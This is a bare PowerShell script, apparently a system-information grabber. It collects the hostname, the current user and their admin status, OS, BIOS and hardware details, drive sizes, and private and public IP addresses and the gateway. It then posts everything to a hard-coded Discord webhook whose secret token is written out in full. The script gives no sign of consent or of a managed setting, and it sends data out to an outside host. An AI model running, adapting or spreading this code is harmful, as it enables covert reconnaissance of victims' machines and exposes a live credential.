$hostname = hostname
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

$isAdmin = (Get-LocalGroupMember -Group "Administrators" | Where-Object {$_.Name -eq $user}) -ne $null

$osName = (Get-ComputerInfo).OsName
$windowsVersion = [System.Environment]::OSVersion.Version
$machineType = (Get-WmiObject -Class Win32_ComputerSystem).SystemType
$processor = (Get-WmiObject -Class Win32_Processor).Name
$cpuUtilization = [math]::Round((Get-Counter '\Processor(_Total)\% Processor Time').CounterSamples.CookedValue, 2)
$totalMemory = [math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
$memoryUtilization = [math]::Round((Get-Counter '\Memory\% Committed Bytes In Use').CounterSamples.CookedValue, 2)
$biosVersion = (Get-WmiObject -Class Win32_BIOS).SMBIOSBIOSVersion
$systemSKU = (Get-WmiObject -Class Win32_ComputerSystem).SystemSKUNumber
$manufacturer = (Get-WmiObject -Class Win32_ComputerSystem).Manufacturer
$product = (Get-WmiObject -Class Win32_BaseBoard).Product

$drives = Get-WmiObject -Class Win32_LogicalDisk -Filter "DriveType=3" | Select-Object DeviceID, @{Name='Capacity(GB)';Expression={[math]::Round($_.Size / 1GB, 2)}}, @{Name='FreeSpace(GB)';Expression={[math]::Round($_.FreeSpace / 1GB, 2)}}

$defaultGateway = (Get-NetRoute -DestinationPrefix "0.0.0.0/0").NextHop
$privateIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Ethernet*").IPAddress
if ($privateIP -like "169.*") {
    $privateIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi-Fi*", "WiFi*").IPAddress
}
$privateIP

$publicIP = (Invoke-RestMethod -Uri "http://ifconfig.me").ToString()

$webhookUrl = "https://discord.com/api/webhooks/1264068784390668320/y_WA4bsa65sFAkNg8YD32pYV_auVOiMZiWxQwivSCU0497DZE81BfMwcckJgGX-SP4CB"
$embed = @{
    title = "$hostname System Information"
    fields = @(
        @{ name = "Hostname"; value = "$hostname"; inline = $true }
        @{ name = "User"; value = "$user"; inline = $true }
        @{ name = "Is Admin"; value = "$isAdmin"; inline = $true }
        @{ name = "OS Name"; value = "$osName"; inline = $true }
        @{ name = "Windows Version"; value = "$windowsVersion"; inline = $true }
        @{ name = "Machine Type"; value = "$machineType"; inline = $true }
        @{ name = "Manufacturer"; value = "$manufacturer"; inline = $true }
        @{ name = "Baseboard Product"; value = "$product"; inline = $true }
        @{ name = "BIOS Version"; value = "$biosVersion"; inline = $true }
        @{ name = "Total Memory"; value = "${totalMemory} GB"; inline = $true }
        @{ name = "Memory Utilization"; value = "$memoryUtilization%"; inline = $true }
        @{ name = "CPU Utilization"; value = "$cpuUtilization%"; inline = $true }
        @{ name = "Public IP Address"; value = "$publicIP"; inline = $true }
        @{ name = "Private IP Address"; value = "$privateIP"; inline = $true }
        @{ name = "Default Gateway"; value = "$defaultGateway"; inline = $true }
    )
}

foreach ($drive in $drives) {
    $embed.fields += @{
        name = "Drive $($drive.DeviceID)"
        value = "Capacity: $($drive.'Capacity(GB)') GB`nFree Space: $($drive.'FreeSpace(GB)') GB"
        inline = $true
    }
}

$embed.fields += @(
    @{ name = "System"; value = "$systemSKU"; inline = $false }
    @{ name = "Processor"; value = "$processor"; inline = $true }
)


$body = @{
    embeds = @($embed)
} | ConvertTo-Json -Depth 4

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json'

